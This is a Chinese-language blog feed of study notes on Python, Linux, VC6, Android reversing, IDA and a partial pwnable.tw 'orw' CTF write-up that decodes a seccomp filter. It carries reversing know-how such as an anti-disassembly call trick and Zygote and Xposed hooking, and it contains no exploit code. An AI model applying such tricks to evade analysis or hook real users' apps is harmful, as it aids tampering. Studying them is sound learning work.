<p>想以前在用c实现一个简单的Server的时候….在处理响应头的时候, 一直没有想到好的方法，只是拼接字符串，因为没有对字符串格式化读写的操作，后来想到了sprintf，简直是神器…</p>
</blockquote>
<p>new一个StringIO对象，就可以用read, readline, write…来操作对象了</p>
<p>py2.x</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> StringIO <span class="token keyword">import</span> StringIO
f_fake <span class="token operator">=</span> StringIO<span class="token punctuation">(</span><span class="token string">'file content'</span><span class="token punctuation">)</span>
f_true <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'./xxx'</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>py3.x</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> io <span class="token keyword">import</span> StringIO
f_fake <span class="token operator">=</span> StringIO<span class="token punctuation">(</span><span class="token string">'file content'</span><span class="token punctuation">)</span>
f_true <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'./xxx'</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="read和getvalue的区别"><a href="#read和getvalue的区别" class="headerlink" title="read和getvalue的区别"></a>read和getvalue的区别</h3><p>read返回当前位置到结尾的部分<br>而getvalue返回整个字符串<br>seek可以设置当前位置(读写指针的位置)</p>
<blockquote>
<p>为什么我seek之后 f.tell()不改变==</p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[issue | 休眠后的网络问题]]></title>
      <url>/2018/01/01/%E4%BC%91%E7%9C%A0%E5%90%8E%E7%9A%84%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[<p>休眠之后, wifi就搜不到了</p>
<p>智障了很久.发现其实重启一下服务就可以</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> network-manager restart
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>另外…才发现<code>xxxctl</code>里的ctl是<code>control</code>的意思</p>
]]></content>
      
        <categories>
            
            <category> issue </category>
            
        </categories>
        
        
        <tags>
            
            <tag> issue </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[日记 | 2017-12-18]]></title>
      <url>/2017/12/18/2017-12-18/</url>
      <content type="html"><![CDATA[<p>我好想记日记…感觉没有日记的日子过得好颓废…我也不知道自己做了什么</p>
<p>决定每天记一篇..即便什么都没做..比如..今天</p>
<p>今天… 什么都没做, 好了结束了</p>
<p>收藏了几个网站感觉不错<br>我要学一学</p>
<p>Linux工具快速教程 <a href="http://linuxtools-rst.readthedocs.io/zh_CN/latest/" target="_blank" rel="external">http://linuxtools-rst.readthedocs.io/zh_CN/latest/</a><br>CTF All in One <a href="https://www.gitbook.com/book/firmianay/ctf-all-in-one/details" target="_blank" rel="external">https://www.gitbook.com/book/firmianay/ctf-all-in-one/details</a><br>CTF wiki <a href="https://ctf-wiki.github.io/ctf-wiki/" target="_blank" rel="external">https://ctf-wiki.github.io/ctf-wiki/</a></p>
<p>还学习了xargs <a href="http://fatmouse.xyz/2016/05/10/2016-05-10-find-grep-xargs-and-pipe/" target="_blank" rel="external">http://fatmouse.xyz/2016/05/10/2016-05-10-find-grep-xargs-and-pipe/</a></p>
<p>其他的时间…都在睡觉…真可怕</p>
<h2 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h2><p>整理一下书单<br>收拾东西准备回家<br>决定一下是不是出去旅游, 然后旅游回去..</p>
<p>林沛满的两本 wireshark书感觉挺好的…床头读物, 睡不着的时候读一读<br>图书馆有…Wireshark数据包分析实战…过几天还手里的书的时候去看看<br>还有一本 gitbook <a href="https://www.gitbook.com/book/wizardforcel/wireshark-manual/details" target="_blank" rel="external">https://www.gitbook.com/book/wizardforcel/wireshark-manual/details</a></p>
<p>2333, 成功有了wireshark书单</p>
]]></content>
      
        <categories>
            
            <category> 日记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> diary </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MDN真好]]></title>
      <url>/2017/12/13/MDN%E7%9C%9F%E5%A5%BD/</url>
      <content type="html"><![CDATA[<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security" target="_blank" rel="external">https://developer.mozilla.org/zh-CN/docs/Web/Security</a><br><a href="https://blog.mozilla.org/security/" target="_blank" rel="external">https://blog.mozilla.org/security/</a></p>
<p>感觉MDN是学web最好的地方之一了…<br>好好读一下</p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[angr从入门到还没入门]]></title>
      <url>/2017/12/13/angr%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E8%BF%98%E6%B2%A1%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><p><a href="http://www.freebuf.com/articles/web/150296.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/150296.html</a><br><a href="https://github.com/Vsane/angr-doc-cn" target="_blank" rel="external">https://github.com/Vsane/angr-doc-cn</a></p>
<h2 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h2><ol>
<li><p>s1 = claripy.Solver()<br>s2 = angr.Project(‘xxx’).factory.entry_state().solver…<br>他们都能添加约束和符号求解,这个内部是…怎么个写的呢…不会是重复代码吧<br>s1.add(x &gt; 10)<br>s2.add(x &gt; 10)<br>但这个他们eval的用法不太一样<br>前者是 s1.solver(e, n)<br>后者是 s2.solver(e)</p>
</li>
<li><p>claripy.BVS 和 angr.Project(‘xxx’).factory.entry_state().solver.BVS<br>一样的问题<br>难道是内部的…各种套吗</p>
</li>
</ol>
<p>1.</p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python在终端里的自动补全]]></title>
      <url>/2017/12/13/python%E5%9C%A8%E7%BB%88%E7%AB%AF%E9%87%8C%E7%9A%84%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8/</url>
      <content type="html"><![CDATA[<p>以前觉得…终端里直接开python的REPL, 测试一些代码段, 没有tab补全关键字…很烦人啊</p>
<p>然后今天在网上找了一段代码加到bashrc里发现可以补全了…用了没两分钟…我把它删掉了</p>
<p>这tm…从来没想过…能补全了…就没法缩进了, 醉了</p>
<p>每次想起node的REPL…再回头看看py的…QAQ, 两行泪水留下来</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>后来…我知道了有个东西叫ipython….</p>
]]></content>
      
        <categories>
            
            <category> 备忘 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[用call压参字符串]]></title>
      <url>/2017/12/11/%E7%94%A8call%E5%8E%8B%E5%8F%82%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      <content type="html"><![CDATA[<p><code>逆向工程核心原理</code>的p278中提到的一个技巧</p>
<p>使用call指令将包含在代码间的字符串压入栈内, 执行了一条call相当于执行了push和jmp, 只能用于汇编编写的程序…(因为C写的程序…字符串是不会直接放在代码段的)</p>
<p>代码大致如下</p>
<pre class="line-numbers language-asm"><code class="language-asm">002D002E    call 0x002D003F -----+
                                 +
002D0033    'R'                  +
002D0034    'E'                  +
...         ...                  +
002D003E    'E'                  +
                                 +
002D003F    <--------------------+
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>利用这个call把0x002D0033处这个字符串压入了栈里, 然后跳到0x002D003F继续执行…call是不一定要返回的…<br>这个trick会不会给反汇编工具带来错觉呢==</p>
<p>我的xp虚拟机起不来了…==顿时想格调硬盘重新开始….这样子前四部分也看不完了….准备跳到第六部分先</p>
]]></content>
      
        <categories>
            
            <category> trick </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 周一 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Essential Linux Device Driver]]></title>
      <url>/2017/12/11/Essential-Linux-Device-Driver/</url>
      <content type="html"><![CDATA[<h2 id="书名"><a href="#书名" class="headerlink" title="书名"></a>书名</h2><p>Essential Linux Device Driver<br>精通Linux设备驱动程序开发<br>还借了几本类似的书…结果一团乱…这本感觉还不错, 翻译也还可以</p>
<h2 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h2><h2 id="内核组件"><a href="#内核组件" class="headerlink" title="内核组件"></a>内核组件</h2>]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux Kernel </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[VC++6.0 Unicode & ascii]]></title>
      <url>/2017/12/05/VC-6-0-Unicode-ascii/</url>
      <content type="html"><![CDATA[<p>准备卸载了Linux, 装个Windows好好学windows编程…<br>现在Windows里搞了个xp + vc6.0<br>然后照着书…敲了一个helloworld…然后…</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"windows.h"</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"tchar.h"</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">MessageBox</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> 
               L<span class="token string">"Hello World!"</span><span class="token punctuation">,</span> 
               L<span class="token string">"Aryb1n"</span><span class="token punctuation">,</span> 
               MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后我的标题就显示一个<code>H</code>….<br>然后我以为是Windows xp太远古了….标题栏就能显示一个字母…</p>
<p>然后我才发现……..<br>VC6.0默认处理的是ASCII, 而我存储的是Lstring…俩字节一个unicode, 所以遇到那个<code>\x00</code>的时候就截止了</p>
<p>找了一下解决办法</p>
<ol>
<li>就用普通的String…不加L前缀</li>
<li>用 <code>TEXT(&quot;Hello world&quot;)</code>, 或者<code>_TEXT</code>, <code>_T</code> (这三个一样), 这个宏定义会根据你的环境…在ascii的时候相当于ascii的string, 在unicode的时候相当于<code>L&quot;String&quot;</code></li>
<li>继续用LString, 在VC6.0里添加宏<code>UNICODE, _UNICODE</code>, <code>[Project Setting] -&gt; [General] -&gt; [Preprocessor definitions]</code>这个框框里加上这俩宏</li>
</ol>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> vc++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[写给自己]]></title>
      <url>/2017/11/12/%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[安卓逆向入门]]></title>
      <url>/2017/11/05/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>好久不写blog, 感觉最近好懒, 喵喵喵, 我也不知道最近干什么去了</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h2><ol>
<li><p>Application类<br>生命周期是整个app的生命周期</p>
<pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manifest</span> <span class="token attr-name">...</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uses-sdk</span> <span class="token attr-name">...</span> <span class="token punctuation">/></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uses-permission</span> <span class="token attr-name">...</span> <span class="token punctuation">/></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>application</span> <span class="token attr-name">...</span><span class="token punctuation">></span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activity</span> <span class="token attr-name">...</span><span class="token punctuation">></span></span>
         ...
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>activity</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>application</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manifest</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>MainActivity类<br>第一个启动的Activity<br>类名不一定叫这个, 但他的<code>intent-filter</code>很重要, 比如我们可以叫<code>FirstActivity</code></p>
<pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activity</span> 
 <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>.FirstActivity<span class="token punctuation">"</span></span>
 <span class="token attr-name"><span class="token namespace">android:</span>label</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>This is my First Activity<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intent-filter</span><span class="token punctuation">></span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>action</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>android.intent.action.MAIN<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>category</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>android.intent.category.LAUNCHER<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>intent-filter</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>activity</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>特殊的permission</p>
<pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uses-permission</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>android.permission.ACCESS_NETWORK_STATE<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<h2 id="四大组件"><a href="#四大组件" class="headerlink" title="四大组件"></a>四大组件</h2><p>Activity<br>Service<br>Broadcast Receiver<br>Content Provider</p>
<h2 id="其他小知识"><a href="#其他小知识" class="headerlink" title="其他小知识"></a>其他小知识</h2><p>arm平台的话的话, so里默认使用的是thumb, 不是ARM</p>
<h1 id="反编译-amp-反汇编"><a href="#反编译-amp-反汇编" class="headerlink" title="反编译 &amp; 反汇编"></a>反编译 &amp; 反汇编</h1><p>在一本书上看到的, 在android设备上的<br><code>反汇编</code>指的是针对<code>NDK</code>产生的so文件进行逆向, 得到汇编<br><code>反编译</code>指的是逆向dex文件, 得到所用语言的源代码(smali???)<br>我怎么感觉怪怪的….</p>
<h1 id="安卓一个项目下-lib文件夹下可能有多个不同名的文件夹里有同名的so"><a href="#安卓一个项目下-lib文件夹下可能有多个不同名的文件夹里有同名的so" class="headerlink" title="安卓一个项目下, lib文件夹下可能有多个不同名的文件夹里有同名的so"></a>安卓一个项目下, lib文件夹下可能有多个不同名的文件夹里有同名的so</h1><pre><code>lib
├── arm64-v8a
│   └── libtest.so
├── armeabi
│   └── libtest.so
├── armeabi-v7a
│   └── libtest.so
├── mips
│   └── libtest.so
└── mips64
    └── libtest.so
</code></pre><p>这个时候, 应该看哪个…有的时候还有x86..而且内容还不太一样<br>自己写个NDK的项目, 先…</p>
<p><a href="http://blog.csdn.net/weijinqian0/article/details/78182307" target="_blank" rel="external">http://blog.csdn.net/weijinqian0/article/details/78182307</a><br><a href="https://zhuanlan.zhihu.com/p/21302804" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/21302804</a><br><a href="http://www.jianshu.com/p/cb05698a1968" target="_blank" rel="external">http://www.jianshu.com/p/cb05698a1968</a><br>其中这个最后一篇里讲到</p>
<blockquote>
<p>当一个应用安装在设备上，只有该设备支持的CPU架构对应的.so文件会被安装。在x86设备上，libs/x86目录中如果存在.so文件的话，会被安装，如果不存在，则会选择armeabi-v7a中的.so文件，如果也不存在，则选择armeabi目录中的.so文件（因为x86设备也支持armeabi-v7a和armeabi）</p>
</blockquote>
<h1 id="反编译后得到形如MainActivity-1-smali-是什么意思"><a href="#反编译后得到形如MainActivity-1-smali-是什么意思" class="headerlink" title="反编译后得到形如MainActivity$1.smali, 是什么意思"></a>反编译后得到形如MainActivity$1.smali, 是什么意思</h1><p>感觉有的逆向根据会产生, 有的会是另一种表现形式<br>一般是内部类… 比如</p>
<pre class="line-numbers language-java"><code class="language-java">Button botton <span class="token operator">=</span> <span class="token punctuation">(</span>Button<span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>id<span class="token punctuation">.</span>button1<span class="token punctuation">)</span><span class="token punctuation">;</span>
button<span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OnClickListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span>View v<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里在<code>OnClickListener</code>接口这里其实有一个<code>基于接口实现的匿名内部类</code>, java学的奇菜…然后补一补</p>
<p>所以这个<code>MainActivity$1.smali</code>里的类会有<code>OnClick</code>方法什么的</p>
<h1 id="有的时候会有dex反编译失败的时候…"><a href="#有的时候会有dex反编译失败的时候…" class="headerlink" title="有的时候会有dex反编译失败的时候…"></a>有的时候会有dex反编译失败的时候…</h1><p>这个时候该怎么办QAQ, md我也不知道啊</p>
<h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><p>准备把以前的小米MAX拿来做题了….<br>真机的话, 直接usb连上去, 开启usb调试, 然后adb就有反应…模拟器真是…</p>
<ol>
<li><p>出现问题 <code>[Errno 104] Connection reset by peer</code><br>这个在网上查找是某个app是<code>debuggable=false</code>的原因…好像记得是不是有一种不需要一个一个应用更改的方法, 好像是…<br>找到一篇<a href="http://blog.csdn.net/feibabeibei_beibei/article/details/52744231" target="_blank" rel="external">blog</a> 有介绍具体方法</p>
</li>
<li><p>找到一份资料是叫<code>安卓动态调试七种武器</code></p>
</li>
</ol>
<h1 id="HOOK"><a href="#HOOK" class="headerlink" title="HOOK"></a>HOOK</h1><p>HOOK有</p>
<ol>
<li>JAVA API HOOK</li>
<li>Native API HOOK</li>
</ol>
<p>如果对Zygote进行HOOK, 那就相当于对所以app都进行了HOOK, 喵喵喵<br>其实所有app都只直接与Zygote有关, 所以相当于安卓程序都是比底下的Linux程序高一层, 对吧, 来自菜鸡的无奈…</p>
<h2 id="xposed-原理"><a href="#xposed-原理" class="headerlink" title="xposed 原理"></a>xposed 原理</h2><p>通过替换<code>/system/bin/app_process</code>来控制Zygote, 使得app_process启动的过程中加载<code>XposedBridge.jar</code>, 从而完成劫持</p>
<p><del>先睡觉, 命要紧</del><br>刚home以已经100%, 然后把swap格掉了, 给了/home, 突然多了8G, 哈哈哈哈</p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 安卓 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[php入门日记]]></title>
      <url>/2017/10/28/php%E5%85%A5%E9%97%A8%E6%97%A5%E8%AE%B0/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[IDA call analysis failed]]></title>
      <url>/2017/10/27/IDA-call-analysis-failed/</url>
      <content type="html"><![CDATA[<p>在静态分析的时候, 某个函数在结尾处出现<code>sp-analysis failed</code>, 并且不能使用f5看c的时候…找到了看雪的两篇帖子</p>
<p><a href="https://bbs.pediy.com/thread-140002.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-140002.htm</a><br><a href="https://bbs.pediy.com/thread-158896.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-158896.htm</a></p>
<p>我遇到的一个问题就在于, main中某个调用函数的参数错误导致堆栈不平</p>
<p>看汇编, 是push了一个地址, 然后call了一个类似puts的函数, 可以把字符串打印出来, 但按一下Y, 能看到这里函数定义是<code>int __cdecl xxx(int, int)</code>, 我们改成<code>int __cdecl xxx(char *)</code>, 再次尝试就可以了<br>不过这个问题造成的原因是什么?</p>
<p>又找到一篇资料 IDA为什么产生 sp-analysis failed 错误?<br><a href="http://blog.csdn.net/dj0379/article/details/8699219" target="_blank" rel="external">http://blog.csdn.net/dj0379/article/details/8699219</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[pwnable.tw calc]]></title>
      <url>/2017/10/16/pwnable-tw-calc/</url>
      <content type="html"><![CDATA[<p>zhe ti tai nan le…<br>wo hao cai a</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pwnable.tw orw]]></title>
      <url>/2017/10/15/pwnable-tw-orw/</url>
      <content type="html"><![CDATA[<p>程序先调用了<code>orw_seccomp</code>函数<br>函数里有两个关键函数</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token function">qmemcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_8048640<span class="token punctuation">,</span> <span class="token number">0x60u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v1 <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span>
v2 <span class="token operator">=</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">;</span>
<span class="token function">prctl</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">prctl</span><span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;v1)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的v1, v2存储上是挨着的, 其实是一个结构体</p>
<p>prctl第一个参数是option, 每个数字代表的含义在<code>/usr/include/linux/prctl.h</code>里可以找到, 这个<a href="http://man7.org/linux/man-pages/man2/prctl.2.html" target="_blank" rel="external">网站</a>有参考</p>
<pre><code>#define PR_SET_NO_NEW_PRIVS    38
#define PR_SET_SECCOMP    22
</code></pre><p>下面这个启用了seccomp沙盒模式, 第二个参数说明了沙盒类型<code>seccomp_mode_filter</code>相当于是设置了函数白名单, 具体filter了哪些函数, 看第三个参数, 第三个参数是个<code>struct sock_fprog</code>, 那我们在IDA里导入这个结构体….[这只是幻想…我好像还没有掌握这个技能…]</p>
<p>我们要做的是把从v3(offset = 0x640 ~ 0x6a0)这里开始的96字节数据dump下来, 然后看看是啥…</p>
<pre><code>dd if=orw of=orw_fprog bs=1 skip=1600 count=96
</code></pre><p>我这一手不娴熟的dd操作….(bs是块的大小, skip和count用的都是这个单位好像)</p>
<p>对照结构体</p>
<pre><code>struct sock_fprog       /* Required for SO_ATTACH_FILTER. */
{
        unsigned short          len;    /* Number of filter blocks */
        struct sock_filter      *filter;
};

struct sock_filter      /* Filter block */
{
        __u16   code;   /* Actual filter code */
        __u8    jt;     /* Jump true */
        __u8    jf;     /* Jump false */
        __u32   k;      /* Generic multiuse field */
};
</code></pre><p>我们的len就是12, 有12个block…每个8字节, 正好96字节, 我们看看sock_filter的内容</p>
<p>找资料说<code>libpcap</code>里有一个<code>bpf_image</code>函数可以那个…把结构体解释成人类可解读的…汇编…写了半天,<del>不知道为什么编译不通过…留下了没技术的泪水</del><br>原来编译的时候忘了加参数…</p>
<p>解释代码</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;pcap.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    FILE <span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./orw_fprog"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buf1<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buf2<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> bpf_insn aa<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">fread</span><span class="token punctuation">(</span>buf1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>aa<span class="token punctuation">,</span> buf1<span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">12</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token function">bpf_image</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>aa<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">// gcc -o unpack unpack.c -lpcap</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果如下….然而我并不能看懂</p>
<pre><code>(000) ld       [4]
(001) jeq      #0x40000003      jt 2    jf 11
(002) ld       [0]
(003) jeq      #0xad            jt 11    jf 4
(004) jeq      #0x77            jt 11    jf 5
(005) jeq      #0xfc            jt 11    jf 6
(006) jeq      #0x1             jt 11    jf 7
(007) jeq      #0x5             jt 11    jf 8
(008) jeq      #0x3             jt 11    jf 9
(009) jeq      #0x4             jt 11    jf 10
(010) ret      #327718
(011) ret      #2147418112
</code></pre><p>code是汇编指令<br>jt是指令结果为true的跳转<br>jf是指令结果为false的跳转<br>k是指令的参数</p>
<p>我猜想..这个的<code>1, 3, 4, 5...</code>是允许的调用号, 后面那些比较大的调用号看起来就没啥用<br>查找一下表</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> __NR_exit 1</span>
<span class="token macro property">#<span class="token directive keyword">define</span> __NR_read 3</span>
<span class="token macro property">#<span class="token directive keyword">define</span> __NR_write 4</span>
